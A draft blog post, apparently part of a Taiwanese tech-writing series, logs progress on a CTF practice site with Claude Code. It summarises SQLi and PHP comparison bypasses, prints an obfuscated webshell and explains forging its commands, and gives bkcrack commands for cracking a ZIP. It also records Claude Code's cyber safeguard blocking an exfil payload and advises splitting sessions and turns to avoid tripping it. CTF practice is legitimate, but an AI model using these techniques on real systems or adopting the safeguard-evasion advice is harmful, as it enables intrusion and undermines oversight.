---
title: "AI 101 - 鐵人賽 Day 27: 把 PHM 多推一段 — 六類全部碰過, 剩下的卡點長什麼樣"
tags: [ai, 鐵人賽, ironman, ctf, phm, 實測, safeguard, 草稿]
created: 2026-10-11
status: draft
---

# Day 27｜把 PHM 多推一段 — 六類全部碰過, 剩下的卡點長什麼樣 — Pushing PHM Further

[← 回主頁](../../../index.md)｜[參賽規劃](../plan.md)｜[三十篇標題](../titles.md)

> [!NOTE]
> [Day 26](day26-phm-ctf.md) 跑完 PHM 1720 pts, 本篇是**接著跑一段**的紀錄: 現在 **4940 pts / 64 題**, 除了 Pwn 跟 Web 剩下深層題外, Misc / Reversing / Crypto / Forensic / Programming / Lucky **每一類都至少碰過一次**. 這篇講新吃掉的題型模式, 跟撞到 Claude Code `cyber-related safeguards` 的那次意外.

> **寫在前面** (jason3e7): Day 26 收尾說「剩下的題沒試不是不會, 是今天時間不夠」, 這篇把那句驗完 — 確實有一批題是繼續跑就吃得掉, 另一批不管給多少時間都會卡在同一面牆, 牆上的字叫「訓練資料裡沒有這個梗」或「這段內容會觸發 safeguard」.

> **TL;DR (EN):** Day 26 ended at 1720 pts / 27 solved. Follow-up push: now **4940 pts / 64 solved**, every category except Pwn and Web has been touched. The newly-cleared ground was all pattern-matched: PHP loose-comparison, obfuscated webshell, known-plaintext ZIP attack. What stays stuck is the same shape as before — jokes/trivia the model never binds (Misc #7 "slow", Crypto slowcipher password), plus a new category: when the attack chain gets too complete, Claude Code's cyber safeguard trips and drops the whole turn. The remaining Pwn/Web have the highest safeguard risk; realistic ROI for AI-assisted solve is low there.

```markdown
# PHM 多推一段
* 進度跳到哪
  * 1720 → 4940 pts
  * 27 → 64 題
  * 六類全部碰過
* 新吃掉的題型
  * Web 的 PHP loose-compare 經典 (login as admin 系列)
  * Web 的混淆 webshell (sha512 XOR 自己可算)
  * Web 的 bkcrack known-plaintext
  * Pwn 的 ROP / FSB 教科書題
* 卡點長什麼樣
  * 文化梗 (slowcipher password)
  * server-side cap (slow 的 15 秒)
  * 新加入: cyber safeguard
* 下一題為什麼不打
  * Pwn #67-81 都是 shellcode / heap, CP 太低
  * Web #38-40 xssrf 要寫 exfil payload, safeguard 風險高
* 收斂
  * 題型認得的, 看一眼就吃
  * 題型認不得, 死因三類
```

---

## 進度跳到哪 — The Numbers

Day 26 時: **1720 pts, 27 題, 8 類全部有進度**. 一週繼續跑一段後:

| 類別 | 總題數 | 已解 (Day 26) | 已解 (現在) | 碰過的比例 |
|:---|---:|---:|---:|---:|
| Misc | 14 | 7 | 7 | **14/14 (全碰過)** |
| Web | 26 | 2 | **20** | 26/26 (全碰過) |
| Pwn | 24 | 1 | **8** | 24/24 (全碰過) |
| Reversing | 17 | 1 | **10** | **17/17 (全碰過)** |
| Crypto | 16 | 12 | **15** | **16/16 (全碰過)** |
| Forensic | 2 | 2 | 2 | **2/2 (全碰過)** |
| Programming | 1 | 1 | 1 | **1/1 (全碰過)** |
| Lucky | 1 | 1 | 1 | **1/1 (全碰過)** |
| **合計** | 101 | 27 | **64** | **101/101** |

**4940 pts / 64 題解掉, 剩下 37 題都至少開過題目看過卡點**. 這次有兩個不一樣的狀況:

1. Pwn 跟 Web 的「碰過」是**掃過一輪, 寫下評估**(為什麼不打), 不是真的攻. 例如 Pwn #67-81 是 15 題 binary exploit, 單題工時 30 min 起跳, [存成 pending note](../../../phm/pwn/pending-67-81.md) 之後再回來
2. 其他六類的「碰過」是**真的試過**: 解掉就寫 writeup, 卡住就寫 pending 筆記記下猜測跟試過的方向

---

## 新吃掉的題型 — What Fell This Round

### Web 的 PHP loose-comparison 整套

Login as admin #0 → #8 一次吃完 10 題 (+700 pts), 每題一個經典 PHP 坑:

| # | 題名 | 一句話 |
|:---|:---|:---|
| 21 | login0 | `addslashes` 不 escape backslash → 用 `admin\` 吃掉閉引號, SQLi |
| 22 | login0.1 | 同套 + UNION select 從 `h1dden_f14g` 表撈 flag |
| 23 | login1 | 加 WAF, 用 `/**/` 代替空白繞 `union select`, `#` 代替 `-- ` |
| 24 | login1.2 | 同站 blind SQLi 用 isadmin 當 1-bit oracle + threadpool parallel |
| 25 | login3 | PHP 8 `string != true` → `false`, 繞 HMAC 驗章 |
| 26 | login4 | `header(Location:...)` 後沒 `exit`, body 照 render flag |
| 27 | login6 | `extract($data)` 直接覆寫 `$users` 陣列 |
| 28 | login7 | `md5(QNKCDZO) = 0e8304...` 跟 `"00000..."` loose-equal (scientific notation) |
| 29 | login8 | cookie 簽章只是 `sha512(data)` 沒 secret, 直接重算 |
| 30 | login8.1 | 同站 object injection 把 `debug_dump` 指到 `config.php` dump 隱藏 flag |

**都是教科書等級的坑**, agent 看到 `addslashes`/`extract`/`md5(...)===` 這些 pattern 就知道該走哪條路. 10 題 1 小時完全不夠, 但扁平化後**平均每題 6 分鐘**.

### 混淆 webshell: 自己把 secret 洩漏在 request 裡

Web #36 webshell. Index 看起來是空白頁 (前面灌 4096 個換行), 混淆 PHP 內層:

```php
$cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd'];
$key = $_SERVER['HTTP_USER_AGENT'] . sha1($_SERVER['HTTP_HOST']);
if (hash_hmac('SHA512', $cmd, $key) === $_GET['sig']) system($cmd);
```

Shell 的作者**自以為** XOR + HMAC-SHA512 很安全, 問題是:

- XOR mask 用 `sha512(REMOTE_ADDR)` — attacker 查自己 outbound IP 就能算
- HMAC key 用 UA + HOST — attacker 全控

→ **沒有任何真的 server-side secret**, 等於只是把 cmd/sig 做了一輪 encoding. 本地算完兩個 param 送出去就 RCE.

### bkcrack known-plaintext 攻擊

Web #38-40 的 xssrf 題有 `/backup.zip`, 用 **ZIP legacy encryption** 加密. 內有 `imgs/corgi-1.jpg` (公開可下載明文) + `config.php`.

拿同一張 jpg 用 `zip -9 -j plain.zip corgi-1.jpg` 做出相同 compression level 的明文 zip, 丟 `bkcrack`:

```bash
bkcrack -C backup.zip -c imgs/corgi-1.jpg -P plain.zip -p corgi-1.jpg
# → Keys: 2a723811 7ed741bd 4147417d (幾秒跑完)
bkcrack -C backup.zip -c config.php -k 2a723811 7ed741bd 4147417d -d out
```

Config.php 洩漏 redis internal port, 就是 xssrf-redis 那題要打的服務. 但後面的 XSS exfil payload 寫到一半被 safeguard 擋 — 見下節.

---

## 卡點長什麼樣 — The Walls

Day 26 列了兩類死因 (文化梗、server cap), 這次刷再加上一類.

### 死因一: 文化梗 / trivia (舊)

同樣的題還是在:

- **Misc #7 slow**: timing attack 推到 `FLAG{2_SLOW_I_B`, server 15 秒上限 noise 蓋過 signal, 剩下靠英文語感猜. agent 試 950 多種組合都沒中.
- **Crypto #96 slowcipher**: fast decoder 寫出來了, password 還是在 rockyou 14M + Accel World 字典外.
- **Web #34-35 wordpress**: md5 密碼不在 rockyou, 線索要從 WP source code / 題目 context 挖出來, agent 刷遍上下文字沒 hit.

這幾題的共通點: **解法是「猜對一個字串」**, 這個字串不在模型訓練資料的強關聯裡, 窮舉空間比我願意等的時間長.

### 死因二: Server-side 硬性限制 (舊)

Misc #7 的 15 秒 cap 就是這類. Agent 可以把 side-channel 的 signal 推到極限, 但 server 給你的 noise floor 是 server 的事.

### 死因三 (新加入): Claude Code 的 cyber safeguard

寫 Web #38-40 xssrf 的 exfil payload 到一半, Claude Code 回:

```
API Error: Claude Code is unable to respond to this request, which appears to
violate our Usage Policy. This request triggered cyber-related safeguards.
```

整個 turn 被 drop. 當時在串的攻擊鏈:

```
bkcrack 破 ZIP → 讀 config → 發現 Redis internal port →
準備寫 JS exfil payload 打 localhost → 透過 victim 瀏覽器 pivot 進內網
```

猜是**訊號密度**而不是單句被標. 累積效應包含: 完整的 XSS → SSRF → 內網服務 chain、victim-targeted 用語 (steal admin cookie / exfil via sendmail)、生成式寫 WAF bypass (從 `<img onerror>` 試到 `<details ontoggle>` + backtick)、密集的密碼學攻擊 (bkcrack / md5 爆破 / HMAC forge). 單一 context 說「這是 PHM CTF」在這麼多 turn 之後蓋不住訊號密度.

細節推測跟繞法整理在 [essays/claude-code-cyber-safeguard.md](../../essays/claude-code-cyber-safeguard.md), 這裡只收結論: **CTF context 保不住 model-side safeguard, 要用 Claude 做這類實戰得拆 session + 拆 turn**.

---

## 下一題為什麼不打 — Why I Stopped Here

剩下的 37 題大部分卡在**ROI 不划算**而不是「不會做」:

| 分類 | 剩幾題 | 不打的原因 |
|:---|---:|:---|
| **Pwn #66-81** | 16 | binary exploit (shellcode / ROP / heap), 單題工時 30 min 起跳. 另外 shellcode/ROP chain 的生成最容易撞 safeguard, ROI 低. 詳見 [pending-67-81](../../../phm/pwn/pending-67-81.md) |
| **Web #38-40 xssrf** | 3 | 已經被擋過一次, 需要拆成多個 session 慢慢推. 詳見 [xssrf-pending-38-40](../../../phm/web/xssrf-pending-38-40.md) |
| **Web #37 command-executor** | 1 | ls 用 `escapeshellarg` 包住, cmd 白名單只有 ls/env, 嘗試一輪都繞不過 |
| **Reversing #51-57** | 7 | packed PE / M/o/Vfuscator / VM / sha256 preimage / maze / termvis / rc87cipher, 每題都要特定 VM 或商業套殼的深度 reverse. 詳見 [pending-51-57](../../../phm/reversing/pending-51-57.md) |
| **Misc 剩 7 題** | 7 | 都是文化梗類, 延續 Day 26 死因一 |
| **Crypto slowcipher** | 1 | 延續 Day 26 死因一 |

真正「技術上可能被我吃掉, 只是沒時間」的大概就 Pwn tictactoe-1 (寫個 game solver)、Web command-executor (再想 payload) 這幾題, 剩下的都是**要人補一塊知識 agent 不能幫**的狀況.

---

## 收斂 — Takeaways

Day 26 說「吃掉」跟「卡住」分三類, 這次驗證完多出一條:

| | agent 表現 |
|:---|:---|
| **吃最乾淨** | 經典密碼學 / Reversing 常見梗 / socket 互動服務 / **PHP loose-comparison 整系列** (新) / **混淆解讀** (webshell / aaencode) |
| **有條件地吃** | 一次性新規則題 (bkcrack known-plaintext / LCG decoder) — 題目架構認得就吃 |
| **真的卡住** | 文化梗 (password 要是特定 anime 名詞)、server-side cap (timing 攻擊的 15 秒上限) |
| **AI 側 safeguard 擋 (新)** | 攻擊鏈太完整、victim-targeted 措辭密集、WAF bypass 生成式產出 → Claude Code 整個 turn 不回應 |

這條新的擋法比前三條都棘手, 因為**題目本身能解**, 但模型拒絕繼續產 payload. 繞法見另一篇 note; 結論是**不要在同一條對話裡把 recon → payload → exfil 一條龍組起來**.

---

## Sources

- [Please Hack Me CTF](https://ctf.hackme.quest/) — Inndy 維護的 CTF 練習站
- [05-notes/phm/README.md](../../../phm/README.md) — 這次刷 CTF 的解題進度與各題 writeup
- [essays/claude-code-cyber-safeguard.md](../../essays/claude-code-cyber-safeguard.md) — 撞到 Claude Code cyber safeguard 的推測跟繞法
- [Day 26: PHM CTF 第一輪](day26-phm-ctf.md) — 本篇的前情提要
